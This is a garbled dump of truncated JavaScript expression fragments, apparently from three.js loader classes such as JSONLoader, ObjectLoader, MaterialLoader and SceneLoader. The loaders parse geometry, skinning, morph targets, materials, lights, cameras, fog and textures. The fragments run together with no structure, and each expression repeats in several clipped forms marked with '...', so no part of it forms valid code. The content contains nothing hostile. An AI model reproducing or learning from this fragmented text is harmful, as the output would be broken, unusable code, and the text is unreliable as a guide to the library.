'scene'json.me ... definedjson.metadatajson.metadata.type'THREE. ... ' + url'THREE. ... der: "'THREE.JSONLoader: "'" seem ... stead.'" seems to be a Scene. Use THREE.SceneLoader instead.var res ... Path );result  ... ePath )context ... ePath )context.parsecallbac ... ials );callbac ... rials )result.geometryresult.materialsconsole ... ty.' );console ... pty.' )'THREE. ... empty.''" seem ... empty.'" seems to be unreachable or the file is empty.context ... lete();context ... plete()context ... ompleteconsole ...  ')' );console ... + ')' )'THREE. ... s + ')''THREE. ... .status'THREE. ... + '" (''THREE. ... load "'THREE.JSONLoader: Couldn't load "" (xhr.rea ... LOADINGxhr.LOADINGif ( ca ... \n\r\n\t\t\t}if ( le ... \r\n\t\t\t\t}length === 0length  ... gth' );length  ... ngth' )xhr.get ... ngth' )xhr.get ... eHeaderContent-Lengthcallbac ... th } );callbac ... gth } ){ total ... ength }total: lengthloaded: ... .lengthxhr.res ... .lengthxhr.rea ... ECEIVEDxhr.HEADERS_RECEIVEDcallbac ... definedlength  ... gth" );length  ... ngth" )xhr.get ... ngth" )xhr.ope ... true );xhr.ope ...  true )xhr.openxhr.wit ... ntials;xhr.wit ... entialsxhr.withCredentialsxhr.send( null );xhr.send( null )xhr.sendTHREE.J ... }\r\n\r\n};THREE.J ... \t}\r\n\r\n}THREE.J ... e.parsevar sco ...  : 1.0;scale = ... e : 1.0( json. ... e : 1.0( json. ... fined )json.sc ... definedjson.scale1.0 / json.scaleparseModel( scale );parseModel( scale )parseSkin();parseSkin()parseMo ... cale );parseMo ... scale )geometr ... mals();geometr ... rmals()geometr ... Normalsvalue & ... ition )( 1 << position )1 << positionvar i,  ... rs = 0;faces = json.facesjson.facesjson.verticesnormals ... normalsjson.normalscolors = json.colorsjson.colorsnUvLayers = 0if ( js ... \r\n\r\n\t\t}json.uv ... definedjson.uvsi < json.uvs.lengthjson.uvs.lengthif ( js ... ers ++;json.uvs[ i ].lengthjson.uvs[ i ]nUvLayers ++;nUvLayers ++i < nUvLayersgeometr ... ] = [];geometr ...  ] = []geometr ... vs[ i ]zLength ... length;zLength ... .lengthwhile ( ... \r\n\r\n\t\t}offset < zLengthvertex  ... tor3();vertex  ... ctor3()vertex. ...  scale;vertex. ... * scalevertice ... * scalevertice ... et ++ ]offset ++geometr ... rtex );geometr ... ertex )type =  ... t ++ ];type =  ... et ++ ]faces[ offset ++ ]isQuad  ... e, 0 );isQuad  ... pe, 0 )isBitSet( type, 0 )hasMate ... e, 1 );hasMate ... pe, 1 )isBitSet( type, 1 )hasFace ... e, 3 );hasFace ... pe, 3 )isBitSet( type, 3 )hasFace ... e, 4 );hasFace ... pe, 4 )isBitSet( type, 4 )hasFace ... e, 5 );hasFace ... pe, 5 )isBitSet( type, 5 )hasFace ... e, 6 );hasFace ... pe, 6 )isBitSet( type, 6 )hasFace ... e, 7 );hasFace ... pe, 7 )isBitSet( type, 7 )faceA = ... ace3();faceA = ... Face3()new THREE.Face3()faceA.a ... fset ];faceA.a ... ffset ]faceA.afaces[ offset ]faceA.b ...  + 1 ];faceA.b ... t + 1 ]faceA.bfaces[ offset + 1 ]faceA.c ...  + 3 ];faceA.c ... t + 3 ]faceA.cfaces[ offset + 3 ]faceB = ... ace3();faceB = ... Face3()faceB.a ...  + 1 ];faceB.a ... t + 1 ]faceB.afaceB.b ...  + 2 ];faceB.b ... t + 2 ]faceB.bfaces[ offset + 2 ]faceB.c ...  + 3 ];faceB.c ... t + 3 ]faceB.coffset += 4;offset += 4if ( ha ... \r\n\t\t\t\t}materia ... t ++ ];materia ... et ++ ]faceA.m ... lIndex;faceA.m ... alIndexfaceA.materialIndexfaceB.m ... lIndex;faceB.m ... alIndexfaceB.materialIndexfi = ge ... length;fi = ge ... .lengthuvLayer ... s[ i ];uvLayer ... vs[ i ]geometr ... ][ fi ]geometr ... i + 1 ]fi + 1for ( j ... \t\t\t\t\t\t}j < 4uvIndex ... t ++ ];uvIndex ... et ++ ]u = uvL ...  * 2 ];u = uvL ... x * 2 ]uvLayer ... x * 2 ]uvIndex * 2v = uvL ...  + 1 ];v = uvL ... 2 + 1 ]uvLayer ... 2 + 1 ]uvIndex * 2 + 1uv = ne ... u, v );uv = ne ...  u, v )new THR ...  u, v )if ( j  ... ( uv );j !== 2geometr ... ( uv );geometr ... h( uv )j !== 0normalI ...  ] * 3;normalI ... + ] * 3faces[  ... + ] * 3faceA.n ... \t\t\t\t\t);faceA.n ... \n\t\t\t\t\t)faceA.normal.setfaceA.normalnormals ... ex ++ ]normalIndex ++normals ... Index ]faceB.n ... rmal );faceB.n ... ormal )faceB.normal.copyfaceB.normali < 4normal  ... \t\t\t\t\t);normal  ... \t\t\t\t\t\t)new THR ... \t\t\t\t\t\t)if ( i  ... rmal );i !== 2faceA.v ... rmal );faceA.v ... ormal )faceA.v ... ls.pushfaceA.vertexNormalsi !== 0faceB.v ... rmal );faceB.v ... ormal )faceB.v ... ls.pushfaceB.vertexNormalscolorIn ... t ++ ];colorIn ... et ++ ]hex = c ... ndex ];hex = c ... Index ]colors[ colorIndex ]faceA.c ...  hex );faceA.c ... ( hex )faceA.color.setHexfaceA.colorfaceB.c ...  hex );faceB.c ... ( hex )faceB.color.setHexfaceB.colorif ( i  ... ex ) );faceA.v ... ex ) );faceA.v ... hex ) )faceA.v ... rs.pushfaceA.vertexColorsnew THR ... ( hex )faceB.v ... ex ) );faceB.v ... hex ) )faceB.v ... rs.pushfaceB.vertexColorsgeometr ... aceA );geometr ... faceA )geometr ... aceB );geometr ... faceB )face =  ... ace3();face =  ... Face3()face.a  ... t ++ ];face.a  ... et ++ ]face.b  ... t ++ ];face.b  ... et ++ ]face.c  ... t ++ ];face.c  ... et ++ ]j < 3face.no ... \t\t\t\t\t);face.no ... \n\t\t\t\t\t)face.normal.setface.ve ... rmal );face.ve ... ormal )face.ve ... ls.pushface.co ... ex ] );face.co ... dex ] )face.color.setHexface.ve ...  ] ) );face.ve ... x ] ) )face.ve ... rs.pushnew THR ... dex ] )geometr ... face );geometr ...  face ){\r\n\t\tva ... ;\r\n\r\n\t}var inf ... ex : 2;influen ... tex : 2( json. ... tex : 2json.in ... definedjson.in ... rVertexjson.skinWeightsi += in ... rVertexl = jso ... .lengthjson.sk ... .lengthvar x = ...      ];x =     ... i     ]json.sk ... i     ]var y = ...  ] : 0;y = ( i ... 1 ] : 0( influ ... 1 ] : 0( influ ... x > 1 )influen ... tex > 1json.sk ... i + 1 ]var z = ...  ] : 0;z = ( i ... 2 ] : 0( influ ... 2 ] : 0( influ ... x > 2 )influen ... tex > 2json.sk ... i + 2 ]var w = ...  ] : 0;w = ( i ... 3 ] : 0( influ ... 3 ] : 0( influ ... x > 3 )influen ... tex > 3json.sk ... i + 3 ]geometr ...  w ) );geometr ... , w ) )geometry.skinWeightsnew THR ...  z, w )json.skinIndicesvar a = ...      ];a =     ... i     ]var b = ...  ] : 0;b = ( i ... 1 ] : 0var c = ...  ] : 0;c = ( i ... 2 ] : 0var d = ...  ] : 0;d = ( i ... 3 ] : 0geometr ...  d ) );geometr ... , d ) )geometry.skinIndicesnew THR ...  c, d )geometr ... .bones;geometr ... n.bonesgeometry.bonesjson.bonesgeometr ... ength )geometr ... gth > 0( geome ... ength )console ... ch.' );console ... tch.' )'When s ... match.''When s ... .length'When s ... ghts (''When s ... ices ('When skinning, number of vertices (), skinIndices ('), and ... ghts ('), and skinWeights () should match.geometr ... mation;geometr ... imationgeometry.animationjson.animationgeometr ... ations;geometr ... mationsgeometry.animationsjson.animationsjson.mo ... definedjson.morphTargetsvar i,  ... rtices;json.mo ... .lengthgeometr ... ] = {};geometr ...  ] = {}geometr ... ts[ i ]geometr ... ].name;geometr ...  ].namejson.mo ...  ].namejson.mo ... ts[ i ]geometr ... s = [];geometr ... es = []geometr ... erticesdstVert ... rtices;dstVert ... erticessrcVert ... rtices;srcVert ... erticesjson.mo ... erticesjson.mo ... s [ i ]for( v  ... \r\n\t\t\t\t}v += 3vl = sr ... .lengthsrcVertices.lengthvar ver ... tor3();srcVert ... * scalesrcVertices[ v ]srcVertices[ v + 1 ]srcVertices[ v + 2 ]v + 2dstVert ... rtex );dstVert ... ertex )dstVertices.pushjson.morphColorsvar i,  ...  color;geometr ... rs[ i ]geometry.morphColorsjson.mo ... rs[ i ]geometr ... rs = []geometr ... .colorsdstColo ... colors;dstColo ... .colorssrcColo ... colors;srcColo ... .colorsjson.mo ... .colorsfor ( c ... \r\n\t\t\t\t}c < clc += 3c = 0,  ... .lengthc = 0cl = sr ... .lengthsrcColors.lengthcolor = ... aa00 );color = ... faa00 )new THR ... faa00 )16755200color.s ...  2 ] );color.s ... + 2 ] )color.setRGBsrcColors[ c ]srcColors[ c + 1 ]c + 1srcColors[ c + 2 ]c + 2dstColo ... olor );dstColo ... color )dstColors.pushif ( js ... ;\r\n\r\n\t}json.ma ... h === 0json.ma ... definedjson.materialsjson.ma ... .lengthreturn  ... etry };{ geome ... metry }geometry: geometryvar mat ... Path );materia ... ePath )this.in ... ePath )this.initMaterialsthis.ne ... rials )this.needsTangentsgeometr ... ents();geometr ... gents()geometr ... angentsreturn  ... ials };{ geome ... rials }materials: materialsTHREE.LoadingManagervar loa ... al = 0;loaded = 0total = 0this.on ... onLoad;this.onLoad = onLoadthis.onLoadthis.on ... ogress;this.on ... rogressthis.onProgressthis.on ... nError;this.on ... onErrorthis.onErrorthis.it ... \r\n\r\n\t};this.it ... ;\r\n\r\n\t}this.itemStarttotal ++;total ++this.it ... }\r\n\r\n\t}this.itemEndloaded ++;loaded ++scope.onProgressscope.o ... otal );scope.o ... total )if ( lo ... \r\n\r\n\t\t}loaded  ... definedloaded === totalscope.onLoadscope.onLoad();scope.onLoad()THREE.D ... ager();THREE.D ... nager()new THR ... nager()THREE.B ... r;\r\n\r\n}THREE.B ... yLoaderconstru ... yLoadervar loa ... ader();loader  ... oader()loader. ... igin );loader. ... rigin )loader. ... sOriginloader. ... \n\t\t} );loader. ... \r\n\t\t} )loader.loadonLoad( ...  ) ) );onLoad( ... t ) ) )scope.p ... ext ) )scope.parseJSON.parse( text )parse:  ... ;\r\n\r\n\t}json.attributesjson.offsetsvar bou ... Sphere;boundin ... gSpherejson.boundingSpherevar keyvar att ...  key ];attribu ... [ key ]attributes[ key ]geometr ... )\r\n\t\t\t}geometr ... [ key ]{\r\n\t\t\t\t ... )\r\n\t\t\t}attribute.itemSizearray:  ... array )new sel ... array )self[ a ... .type ]attribute.typeif ( of ... \r\n\r\n\t\t}offsets ... definedgeometr ... ts ) );geometr ... ets ) )JSON.pa ... ets ) )JSON.st ... fsets )boundin ... definedgeometr ... \r\n\t\t\t);geometr ... s\r\n\t\t\t)new THR ... s\r\n\t\t\t)new THR ... , 0 ] )new THR ... omArrayboundin ...  0, 0 ]boundin ... .centerboundin ... .radiusTHREE.M ... r;\r\n\r\n}THREE.MaterialLoaderconstru ... lLoadervar mat ... type ];materia ... .type ]new THR ... .type ]THREE[ json.type ]json.typeif ( js ... olor );json.co ... definedjson.colormateria ... olor );materia ... color )materia ... .setHexmaterial.colorif ( js ... ient );json.am ... definedjson.ambientmateria ... ient );materia ... bient )material.ambientif ( js ... sive );json.em ... definedjson.emissivemateria ... sive );materia ... ssive )material.emissiveif ( js ... ular );json.sp ... definedjson.specularmateria ... ular );materia ... cular )material.specularif ( js ... niness;json.sh ... definedjson.shininessmateria ... niness;materia ... ininessmaterial.shininessif ( js ... Colors;json.ve ... definedjson.vertexColorsmateria ... Colors;materia ... xColorsif ( js ... ending;json.bl ... definedjson.blendingmateria ... ending;materia ... lendingmaterial.blendingif ( js ... n.side;json.si ... definedjson.sidemateria ... n.side;materia ... on.sideif ( js ... pacity;json.op ... definedjson.opacitymateria ... pacity;materia ... opacitymaterial.opacityif ( js ... parent;json.tr ... definedjson.transparentmateria ... parent;materia ... sparentif ( js ... eframe;json.wi ... definedjson.wireframemateria ... eframe;materia ... reframematerial.wireframemateria ...  ] ) );materia ... i ] ) )materia ... ls.pushmaterial.materialsthis.pa ... [ i ] )this.parsejson.materials[ i ]THREE.O ... r;\r\n\r\n}THREE.ObjectLoaderTHREE.O ... )\r\n\r\n};THREE.O ... ()\r\n\r\n}{\r\n\r\n\tc ... ()\r\n\r\n}constru ... tLoadervar loa ... ager );loader  ... nager )new THR ... nager )var geo ... ries );geometr ... tries )this.pa ... tries )this.parseGeometriesjson.geometriesvar mat ... ials );materia ... rials )this.pa ... rials )this.parseMaterialsvar obj ... ials );object  ... rials )this.parseObjectjson.objectparseGe ... ;\r\n\r\n\t}var geometries = {};geometries = {}json !== undefinedvar geo ... ader();geometr ... oader()var buf ... ader();bufferG ... oader()l = json.lengthjson.lengthvar geometry;var dat ... n[ i ];data = json[ i ]json[ i ]switch  ... \r\n\t\t\t\t}data.typecase 'P ... \tbreak;geometr ... \t\t\t\t\t);geometr ... \t\t\t\t\t\t)data.widthdata.heightdata.widthSegmentsdata.heightSegmentscase 'BoxGeometry':case 'C ... \tbreak;THREE.BoxGeometrydata.depthdata.depthSegmentsTHREE.CircleGeometrydata.radiusdata.segmentsTHREE.C ... eometrydata.radiusTopdata.radiusBottomdata.radialSegmentsdata.openEndedcase 'S ... \tbreak;THREE.SphereGeometrydata.phiStartdata.phiLengthdata.thetaStartdata.thetaLengthcase 'I ... \tbreak;'Icosah ... ometry'THREE.I ... eometrydata.detailcase 'T ... \tbreak;THREE.TorusGeometrydata.tubedata.tubularSegmentsdata.arcTHREE.T ... eometrydata.pdata.qdata.heightScalecase 'B ... \tbreak;geometr ... data );geometr ... .data )bufferG ... .data )bufferG ... r.parsedata.datacase 'G ... \tbreak;geometryLoader.parsegeometr ... a.uuid;geometr ... ta.uuidgeometry.uuiddata.uuidif ( da ... a.name;data.na ... defineddata.namegeometr ... a.name;geometr ... ta.namegeometry.namegeometr ... .uuid ]return geometries;parseMa ... ;\r\n\r\n\t}var materials = {};materials = {}var mat ... data );materia ...  data )loader.parse( data )loader.parsemateria ... a.uuid;materia ... ta.uuidmaterial.uuidmateria ... a.name;materia ... ta.namemateria ... .uuid ]return materials;parseOb ... \n\r\n\t}()var object;object  ... cene();object  ... Scene()object  ... .far );object  ... a.far )new THR ... a.far )data.fovdata.aspectdata.neardata.farcase 'O ... \tbreak;data.leftdata.rightdata.topdata.bottomcase 'A ... \tbreak;object  ... olor );object  ... color )data.colorcase 'D ... \tbreak;object  ... sity );object  ... nsity )new THR ... nsity )data.intensityobject  ... ance );object  ... tance )new THR ... tance )data.distanceobject  ... nent );object  ... onent )new THR ... onent )data.angledata.exponentcase 'H ... \tbreak;data.groundColorcase 'M ... \tbreak;var geo ... etry ];geometr ... metry ]data.geometryvar mat ... rial ];materia ... erial ]data.materialif ( ge ... \n\t\t\t\t\t}geometr ... defined'THREE. ... eometry'THREE. ... metry 'THREE.ObjectLoader: Undefined geometry console ... rial );console ... erial )'THREE. ... aterial'THREE. ... erial 'THREE.ObjectLoader: Undefined material object  ... rial );object  ... erial )new THR ... erial )default ... ct3D();object. ... a.uuid;object. ... ta.uuidobject.uuidobject. ... a.name;object. ... ta.nameif ( da ... \n\r\n\t\t\t}data.ma ... defineddata.matrixmatrix. ... trix );matrix. ... atrix )matrix.fromArraymatrix. ... cale );matrix. ... scale )matrix.decomposeif ( da ... tion );data.po ... defineddata.positionobject. ... omArraydata.ro ... defineddata.rotationobject. ... ation )if ( da ... cale );data.sc ... defineddata.scaleif ( da ... isible;data.vi ... defineddata.visibleif ( da ... erData;data.us ... definedobject. ... erData;object. ... serDatadata.ch ... defineddata.childrenvar childobject. ... ls ) );object. ... als ) )data.ch ... child ]THREE.S ... );\r\n\r\n}THREE.SceneLoaderthis.on ... n() {};this.on ... on() {}this.ca ...  () {};this.ca ... n () {}this.callbackSyncthis.ca ... rogressthis.ge ... rs = {}this.ge ... andlersthis.hi ... s = {};this.hi ... rs = {}this.hi ... andlersthis.ad ... ader );this.ad ... oader )this.ad ... Handlerasciiscope.p ...  url );scope.p ... , url )addGeom ... ;\r\n\r\n\t}this.ge ... lass };this.ge ... Class }this.ge ... ypeID ]{ "load ... Class }"loader ... erClassaddHier ... ;\r\n\r\n\t}this.hi ... lass };this.hi ... Class }this.hi ... ypeID ]var url ...  url );urlBase ... ( url )THREE.L ... ( url )THREE.L ... UrlBasevar geo ... result;var tar ... y = [];target_array = []var data = json;data = jsonvar typeIDvar loa ... ass" ];loaderC ... lass" ]this.ge ... lass" ]this.ge ... lass();this.ge ... Class()this.ge ... ject" ]loaderObjectnew loaderClass()this.hi ... lass" ]this.hi ... lass();this.hi ... Class()this.hi ... ject" ]counter_models = 0;counter_models = 0counter ... es = 0;counter_textures = 0result  ... \n\r\n\t\t};result  ... \r\n\r\n\t\t}scene:  ... Scene()geometries: {}face_materials: {}materials: {}textures: {}objects: {}cameras: {}lights: {}fogs: {}empties: {}groups: {}if ( da ... \r\n\r\n\t\t}data.transformvar pos ... .scale;data.tr ... ositionrotatio ... otationdata.tr ... otationscale = ... m.scaledata.transform.scaleresult. ... tion );result. ... ition )result. ... omArrayresult. ... ositionresult.sceneif ( ro ... \n\r\n\t\t\t}result. ... ation )result. ... otationresult. ... cale );result. ... scale )result.scene.scalepositio ... | scaleposition || rotationresult. ... trix();result. ... atrix()result. ... eMatrixresult. ... orld();result. ... World()result. ... ixWorldif ( ur ... \n\r\n\t\t\t}url_typ ... ToHTML"relativeToHTMLreturn source_url;return  ... ce_url;urlBase + source_urlhandle_ ... ects );handle_ ... jects )data.objectsvar mat ... , quat;var objIDvar obj ... bjID ];object  ... objID ]result. ... objID ]result.objectsobjJSON ... objID ]children[ objID ]if ( ob ... \n\t\t\t\t\t}objJSON ... dlers )objJSON.type( objJS ... dlers )objJSON ... andlersscope.h ... andlersobjJSON ... definedobjJSON.loadingvar res ... \t\t\t\t\t};reserve ... \t\t\t\t\t\t}"type": 1"url": 1"material": 1"position": 1"rotation": 1"scale" : 1"visible": 1"children": 1"userData": 1"skin": 1"morph": 1"mirroredLoop": 1"duration": 1var loa ... s = {};loaderP ... rs = {}var parTypeif ( !  ... \t\t\t\t\t\t}! ( par ... Types )( parTy ... Types )parType ... edTypesloaderP ... Type ];loaderP ... rType ]objJSON[ parType ]materia ... rial ];result. ... erial ]objJSON.materialobjJSON ... = true;objJSON ...  = truevar loa ... ect" ];loader  ... ject" ]scope.h ... ject" ]scope.h ... .type ]if ( lo ... \t\t\t\t\t\t}loader.optionsloader. ... ON ) );loader. ... SON ) )get_url ... eType )objJSON.urldata.urlBaseTypecreate_ ... jJSON )create_ ... ierachyloader. ... ters );loader. ... eters )objJSON.geometrygeometr ... etry ];result. ... metry ]result.geometriesif ( ge ... \t\t\t\t\t\t}needsTa ... = falseneedsTa ... terial;needsTa ... aterialpos = o ... sition;pos = o ... ositionobjJSON.positionrot = o ... tation;rot = o ... otationobjJSON.rotationscl = objJSON.scale;scl = objJSON.scaleobjJSON.scalemat = o ... matrix;mat = objJSON.matrixobjJSON.matrixquat =  ... ernion;quat =  ... ternionobjJSON.quaternion! objJSON.materialmateria ... ry ] );materia ... try ] )new THR ... try ] )result. ... terialsif ( (  ... \t\t\t\t\t\t}( mater ... h === 0( mater ... erial )materia ... h === 0materia ... .lengthi < mat ... .lengthneedsTa ... rial );needsTa ... erial )materia ... ls[ i ]if ( ne ... \t\t\t\t\t\t}objJSON.skinTHREE.SkinnedMeshobjJSON.morphTHREE.MorphAnimMeshobjJSON.durationobject. ... ration;object. ... urationobject.durationobjJSON.timeobject. ... N.time;object. ... ON.timeobject.timeobjJSON.mirroredLoopobject. ... edLoop;object. ... redLoopobject.mirroredLoopmateria ... Normalsobject.name = objID;object.name = objIDobject. ...  false;object. ... \t\t\t\t\t);object. ... \t\t\t\t\t\t)object.matrix.setmat[0]mat[1]mat[2]mat[3]mat[4]mat[5]mat[6]mat[7]mat[8]mat[9]mat[10]mat[11]mat[12]mat[13]mat[14]mat[15]object. ...  pos );object. ... ( pos )if ( qu ... \t\t\t\t\t\t}object. ... quat );object. ...  quat )object. ...  rot );object. ... ( rot )object. ...  scl );object. ... ( scl )objJSON.visibleobjJSON.castShadowobjJSON ... eShadowparent. ... ject );parent.add( object )parent.addresult. ... object;result. ...  objectobjJSON ... aLight"objJSON ... eLight"objJSON ... tLight"objJSON ... lLight"var col ... .color;color = ... N.colorobjJSON.colorvar int ... ensity;intensi ... tensityobjJSON.intensityvar dis ... stance;distanc ... istanceobjJSON.distancevar rot ... tation;switch  ... \t\t\t\t\t\t}light = ... olor );light = ... color )light = ... ance );light = ... tance )light.p ... tion );light.p ... ition )light.p ... omArraylight.positionlight = ... sity );light = ... nsity )light.p ... ction )objJSON.directionlight = ... e, 1 );light = ... ce, 1 )new THR ... ce, 1 )light.a ... N.angleobjJSON.anglelight.t ...  2 ] );light.t ... [ 2 ] )light.target.setposition[ 0 ]positio ... istanceposition[ 1 ]position[ 2 ]light.t ... Z' ) );light.t ... YZ' ) )light.t ... lyEulernew THR ... 'XYZ' )rotation[ 0 ]rotation[ 1 ]rotation[ 2 ]light = ... nsity);light = ... ensity)new THR ... ensity)light.w ... N.size;light.w ... ON.sizelight.widthobjJSON.sizelight.h ... size_y;light.h ... .size_ylight.heightobjJSON.size_yparent.add( light );parent.add( light )light.name = objID;light.name = objIDlight.nameresult. ...  light;result. ... = lightresult.lightsobjJSON ... Camera"camera  ... .far );camera  ... N.far )new THR ... N.far )objJSON.fovobjJSON.aspectobjJSON.nearobjJSON.farobjJSON.leftobjJSON.rightobjJSON.topobjJSON.bottomcamera.name = objID;camera.name = objIDcamera.namecamera. ...  pos );camera. ... ( pos )camera. ... omArraycamera.positionquat !== undefinedcamera. ... quat );camera. ...  quat )camera.quaternionif ( ro ... \t\t\t\t\t\t}rot !== undefinedcamera. ...  rot );camera. ... ( rot )camera.rotationparent. ... mera );parent.add( camera )result. ... camera;result. ...  cameraresult.camerasobject. ... : false( objJS ... : false( objJS ... fined )result.emptiesobjJSON.userDatavar val ...  key ];value = ... [ key ]objJSON ... [ key ]object. ...  value;object. ... = valueobject. ... [ key ]objJSON.groupsi < obj ... .lengthobjJSON ... .lengthvar gro ... s[ i ];groupID ... ps[ i ]objJSON.groups[ i ]if ( re ... \t\t\t\t\t\t}result. ... definedresult. ... oupID ]result.groupsresult. ... ] = [];result. ...  ] = []result. ... bjID );result. ... objID )result. ...  ].pushobject  ... definedobject !== undefinedobjJSON.childrenhandle_ ... dren );handle_ ... ldren )result. ...  = geo;result. ... ] = georesult. ... s[ id ]result. ...  = mat;result. ... ] = mathandle_objects();handle_objects()var p = ... sition;p = obj.positionobj.positionvar r = ... tation;r = obj.rotationobj.rotationvar q = ... ernion;q = obj.quaternionobj.quaternionvar s = obj.scale;s = obj.scaleobj.scalenode.po ... y( p );node.po ... ay( p )node.po ... omArraynode.positionif ( q  ... \n\r\n\t\t\t}node.qu ... y( q );node.qu ... ay( q )node.qu ... omArraynode.quaternionnode.ro ... y( r );node.ro ... ay( r )node.ro ... omArraynode.rotationnode.sc ... y( s );node.sc ... ay( s )node.scale.fromArraynode.scalenode.tr ... \t\t\t} );node.tr ... \t\t\t\t} )node.traversechild.m ... terial;child.m ... aterialchild.materialvar vis ... : true;visible ...  : true( obj.v ...  : true( obj.v ... fined )obj.vis ... definedobj.visiblenode.tr ... \n\t\t\t} )child.v ... isible;child.v ... visiblechild.visibleparent.add( node );parent.add( node )node.name = id;node.name = idnode.nameresult. ... = node;result. ...  = noderesult.objects[ id ]create_ ... eometryreturn  ... \n\r\n\t\t\t}geo.name = id;geo.name = idgeo.namehandle_ ... , id );handle_ ... t, id )counter_models -= 1;counter_models -= 1scope.o ... lete();scope.o ... plete()scope.onLoadCompleteasync_c ... gate();async_c ... _gate()var result;if ( ev ... \r\n\t\t\t\t}event.contentresult  ... ontent;result  ... contentevent.daeresult  ... .scene;result = event.sceneevent.sceneresult = event;result = eventhandle_ ...  obj );handle_ ... , obj )create_ ... k_embedvar pro ... \r\n\t\t\t};progres ... \n\r\n\t\t\t}totalMo ... _modelstotalTe ... exturesloadedM ... _modelstotal_m ... _modelsloadedT ... exturestotal_t ... exturesscope.c ... sult );scope.c ... esult )scope.c ... rogressscope.o ... ress();scope.o ... gress()scope.onLoadProgressif ( co ... \n\r\n\t\t\t}counter ... s === 0counter_models === 0finalize();finalize()callbac ... sult );callbac ... esult )i < tar ... .lengthtarget_array.lengthvar ta  ... y[ i ];ta = ta ... ay[ i ]target_array[ i ]var tar ... Name ];target  ... tName ]result. ... tName ]ta.targetNameif ( ta ... \r\n\t\t\t\t}ta.obje ... target;ta.obje ...  targetta.object.targetta.objectta.obje ... ct3D();ta.obje ... ect3D()result. ... rget );result. ... arget )result.scene.addta.obje ... object;ta.obje ... .objectta.obje ... Inverseta.obje ... serDatavar cal ... \n\r\n\t\t};callbac ... \r\n\r\n\t\t}counter ...  count;counter ... = countvar gen ... \n\r\n\t\t};generat ... \r\n\r\n\t\t}generat ... allbackreturn  ... \r\n\t\t\t};callbac ... ount );callbac ... count )travers ... erarchycallback( objJSON );callback( objJSON )var objChildIDtravers ... back );travers ... lback )objJSON ... ildID ]var fogID, fogJSON;data.fogsfogJSON ... ogID ];fogJSON ... fogID ]data.fogs[ fogID ]if ( fo ... \n\r\n\t\t\t}fogJSON ... linear"fogJSON.typelinearfog = n ... .far );fog = n ... N.far )THREE.FogfogJSON.nearfogJSON.farfogJSON ...  "exp2"exp2fog = n ... sity );fog = n ... nsity )THREE.FogExp2fogJSON.densitycolor = ... .color;fogJSON.colorfog.col ... r[2] );fog.col ... or[2] )fog.color.setRGBfog.colorcolor[0]color[1]color[2]result. ...  = fog;result. ... ] = fogresult.fogs[ fogID ]result.fogsvar geoID, geoJSON;for ( g ... \r\n\r\n\t\t}data.geometriesgeoJSON ... eoID ];geoJSON ... geoID ]data.ge ... geoID ]geoJSON ... andlersgeoJSON.typecounter_models += 1;counter_models += 1scope.onLoadStart();scope.onLoadStart()scope.onLoadStarttravers ... \n\t\t\t});travers ... \r\n\t\t\t})data.ob ... objID ]total_m ... models;geoJSON ...  "cube"cubegeometr ... ents );geometr ... ments )new THR ... ments )geoJSON.widthgeoJSON.heightgeoJSON.depthgeoJSON ... egmentsgeometr ...  geoID;geometr ... = geoIDresult. ... ometry;result. ... eometryresult. ... geoID ]geoJSON ... "plane"geoJSON ... sphere"geoJSON.radiusgeoJSON ... linder"cylindergeometr ... Segs );geometr ... tSegs )new THR ... tSegs )geoJSON.topRadgeoJSON.botRadgeoJSON.radSegsgeoJSON.heightSegsgeoJSON ... "torus"torusgeometr ... ntsT );geometr ... entsT )new THR ... entsT )geoJSON.tubegeoJSON.segmentsRgeoJSON.segmentsTgeoJSON ... hedron"icosahedrongeometr ... ions );geometr ... sions )new THR ... sions )geoJSON.subdivisionsif ( pa ... \n\t\t\t\t\t}parType ... = "url"parType !== "type"parType !== "url"geoJSON[ parType ]this.ge ... .type ]geoJSON.urlcreate_ ... geoID )geoJSON ... bedded"embeddedvar mod ... h = "";modelJs ... ON.id ]data.em ... ON.id ]data.embedsgeoJSON.idtexture_path = ""modelJs ... tadata;modelJs ... etadatamodelJson.metadatadata.metadataif ( mo ... \r\n\t\t\t\t}var jso ... ect" ];jsonLoa ... ject" ]this.ge ... scii" ]var mod ... path );model = ... _path )jsonLoa ... _path )jsonLoader.parsecreate_ ... ials );create_ ... rials )model.geometrymodel.materialsvar tex ... reJSON;for ( t ... \r\n\r\n\t\t}data.texturestexture ... reID ];texture ... ureID ]data.te ... ureID ]if ( te ... \n\r\n\t\t\t}texture ... f ArraytextureJSON.urlcounter ... length;counter ... .lengthtexture ... .lengthfor( va ... \r\n\t\t\t\t}n < tex ... .lengthcounter ... s += 1;counter ... es += 1total_t ... xtures;textureJSON.mappingTHREE[  ... pping ]texture ... ng ]();texture ... ing ]()new THR ... ing ]()var cou ... length;count = ... .lengthvar url_array = [];url_array = []i < counturl_arr ... Type );url_arr ... eType )url_array[ i ]textureJSON.url[ i ]var isC ...  0 ] );isCompr ... [ 0 ] )/\.dds$ ... [ 0 ] )url_array[ 0 ]if ( is ... \r\n\t\t\t\t}texture ... nt ) );texture ... unt ) )THREE.I ... unt ) )THREE.I ... ureCubeloadCom ... ureCubegenerat ... count )var isC ... .url );isCompr ... N.url )/\.dds$ ... N.url )var ful ... Type );fullUrl ... eType )var tex ... k( 1 );texture ... ck( 1 )generat ... ck( 1 )texture ... back );texture ... lback )THREE.I ... lback )if ( TH ... lter ];THREE[  ... ilter ]texture ... nFiltertexture ... lter ];texture ... ilter ]texture.minFiltertexture ... gFiltertexture.magFilterif ( te ... otropy;texture ... sotropytexture ... otropy;texture.anisotropyif ( te ... \r\n\t\t\t\t}textureJSON.repeattexture ...  1 ] );texture ... [ 1 ] )texture.repeat.settexture.repeattexture ... at[ 0 ]texture ... at[ 1 ]if ( te ... apping;texture ... ] !== 1texture ... apping;texture ... rappingtexture.wrapStexture.wrapTtextureJSON.offsettexture.offset.settexture.offsettexture ... et[ 0 ]texture ... et[ 1 ]textureJSON.wrapvar wra ... \n\t\t\t\t\t}wrapMap ... \n\t\t\t\t\t}wrapMap ... [ 0 ] ]texture ... ap[ 0 ]texture ...  0 ] ];texture ... [ 0 ] ]wrapMap ... [ 1 ] ]texture ... ap[ 1 ]texture ...  1 ] ];texture ... [ 1 ] ]result. ... exture;result. ... textureresult. ... ureID ]result.texturesvar matID, matJSON;var parID;for ( m ... \r\n\r\n\t\t}data.materialsmatJSON ... atID ];matJSON ... matID ]data.ma ... matID ]for ( p ... \n\r\n\t\t\t}matJSON.parametersif ( pa ... \r\n\t\t\t\t}parID = ... umpMap"parID = ... ghtMap"parID = ... = "map"parID === "envMap"parID === "map"parID === "lightMap"parID === "bumpMap"matJSON ... ID ] ];matJSON ... rID ] 